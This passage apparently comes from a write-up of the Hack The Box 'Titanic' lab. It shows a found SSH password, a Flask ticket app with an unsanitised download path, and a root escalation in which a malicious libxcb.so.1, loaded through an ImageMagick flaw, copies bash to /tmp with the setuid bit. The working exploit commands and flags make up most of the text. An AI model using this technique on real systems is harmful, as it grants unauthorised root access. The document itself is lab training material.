
we got developers:25282528

```sh
┌──(kali㉿kali)-[~/Downloads/htb-titanic]
└─$ ssh developer@titanic.htb                                  
The authenticity of host 'titanic.htb (10.129.231.221)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes     
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
developer@titanic.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar 29 10:34:29 PM UTC 2025

  System load:           0.08
  Usage of /:            67.5% of 6.79GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.231.221
  IPv6 address for eth0: dead:beef::250:56ff:fe94:d10c


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

developer@titanic:~$ 
```

we're in! :)

```sh
developer@titanic:~$ ls -la
total 40
drwxr-x--- 7 developer developer 4096 Feb  3 17:09 .
drwxr-xr-x 3 root      root      4096 Aug  1  2024 ..
lrwxrwxrwx 1 root      root         9 Jan 29 12:27 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer 3771 Jan  6  2022 .bashrc
drwx------ 3 developer developer 4096 Aug  1  2024 .cache
drwxrwxr-x 3 developer developer 4096 Aug  2  2024 gitea
drwxrwxr-x 5 developer developer 4096 Aug  1  2024 .local
drwxrwxr-x 2 developer developer 4096 Aug  2  2024 mysql
-rw-r--r-- 1 developer developer  807 Jan  6  2022 .profile
drwx------ 2 developer developer 4096 Aug  1  2024 .ssh
-rw-r----- 1 root      developer   33 Mar 29 21:30 user.txt

developer@titanic:~$ cat user.txt
1e5da164b2f52041f2d52beba25fd7cb
```

there's a lot of stuff in opt!
```sh
developer@titanic:/opt$ ls -laR *
app:
total 24
drwxr-xr-x 5 root developer 4096 Feb  7 10:37 .
drwxr-xr-x 5 root root      4096 Feb  7 10:37 ..
-rwxr-x--- 1 root developer 1598 Aug  2  2024 app.py
drwxr-x--- 3 root developer 4096 Feb  7 10:37 static
drwxr-x--- 2 root developer 4096 Feb  7 10:37 templates
drwxrwx--- 2 root developer 4096 Mar 29 21:40 tickets

app/static:
total 16
drwxr-x--- 3 root developer 4096 Feb  7 10:37 .
drwxr-xr-x 5 root developer 4096 Feb  7 10:37 ..
drwxr-x--- 3 root developer 4096 Feb  7 10:37 assets
-rw-r----- 1 root developer  567 Aug  1  2024 styles.css

app/static/assets:
total 12
drwxr-x--- 3 root developer 4096 Feb  7 10:37 .
drwxr-x--- 3 root developer 4096 Feb  7 10:37 ..
drwxrwx--- 2 root developer 4096 Feb  3 17:13 images

app/static/assets/images:
total 1288
drwxrwx--- 2 root developer   4096 Feb  3 17:13 .
drwxr-x--- 3 root developer   4096 Feb  7 10:37 ..
-rw-r----- 1 root developer 291864 Feb  3 17:13 entertainment.jpg
-rw-r----- 1 root developer 280854 Feb  3 17:13 exquisite-dining.jpg
-rw-r----- 1 root developer 209762 Feb  3 17:13 favicon.ico
-rw-r----- 1 root developer 232842 Feb  3 17:13 home.jpg
-rw-r----- 1 root developer 280817 Feb  3 17:13 luxury-cabins.jpg
-rw-r----- 1 root developer    442 Mar 29 22:38 metadata.log

app/templates:
total 16
drwxr-x--- 2 root developer 4096 Feb  7 10:37 .
drwxr-xr-x 5 root developer 4096 Feb  7 10:37 ..
-rw-r----- 1 root developer 7568 Aug  1  2024 index.html

app/tickets:
total 8
drwxrwx--- 2 root developer 4096 Mar 29 21:40 .
drwxr-xr-x 5 root developer 4096 Feb  7 10:37 ..
ls: cannot open directory 'containerd': Permission denied

scripts:
total 12
drwxr-xr-x 2 root root 4096 Feb  7 10:37 .
drwxr-xr-x 5 root root 4096 Feb  7 10:37 ..
-rwxr-xr-x 1 root root  167 Feb  3 17:11 identify_images.sh
```

app.py is the web app for the tickets:
```python
from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

# Directory to save the JSON files
TICKETS_DIR = "tickets"

# Ensure the directory exists
if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    # Generate a unique ID for the ticket
    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    # Save the data as a JSON file
    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    # Redirect to the download URL with the ticket filename
    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)

```

identify_images.sh looks interesting!
```sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

we make a library file according to ^ (watch out, it is deleted):
```sh
developer@titanic:/opt/app/static/assets/images$ which bash
/usr/bin/bash

developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){
    system("cp /usr/bin/bash /tmp/bash;chmod +s /tmp/bash");
    exit(0);
}
EOF

developer@titanic:/opt/app/static/assets/images$ ls -la /tmp
total 1428
drwxrwxrwt 14 root      root         4096 Mar 29 23:58 .
drwxr-xr-x 19 root      root         4096 Feb  7 10:37 ..
-rwsr-sr-x  1 root      root      1396520 Mar 29 23:58 bash
-rw-r--r--  1 root      root           33 Mar 29 23:50 root.txt
...

developer@titanic:/opt/app/static/assets/images$ /tmp/bash -p

bash-5.1# whoami
root

bash-5.1# id
uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer)

bash-5.1# cd /root

bash-5.1# ls -la
total 52
drwx------  7 root root      4096 Mar 29 21:30 .
drwxr-xr-x 19 root root      4096 Feb  7 10:37 ..
lrwxrwxrwx  1 root root         9 Jan 29 12:29 .bash_history -> /dev/null
-rw-r--r--  1 root root      3106 Oct 15  2021 .bashrc
drwx------  2 root root      4096 Jan 27 15:28 .cache
-rwxr-xr-x  1 root root        68 Feb  5 14:55 cleanup.sh
drwxrwx---  2 root developer 4096 Feb  3 17:13 images
-rw-------  1 root root        20 Feb  7 11:25 .lesshst
drwxr-xr-x  3 root root      4096 Aug  1  2024 .local
-rw-r--r--  1 root root       161 Jul  9  2019 .profile
-rwxr-xr-x  1 root root       104 Feb  3 17:26 revert.sh
-rw-r-----  1 root root        33 Mar 29 21:30 root.txt
drwx------  3 root root      4096 Aug  1  2024 snap
drwx------  2 root root      4096 Aug  1  2024 .ssh

bash-5.1# cat root.txt
46468cff61c2749510b5271e6f20caf3
```

also:
```sh
bash-5.1# cat revert.sh
#!/bin/bash

/usr/bin/rm /opt/app/tickets/*.json
/usr/bin/cp -a -r /root/images /opt/app/static/assets/

#!/bin/bash

/usr/bin/rm /opt/app/static/assets/images/libxcb.so.1

```

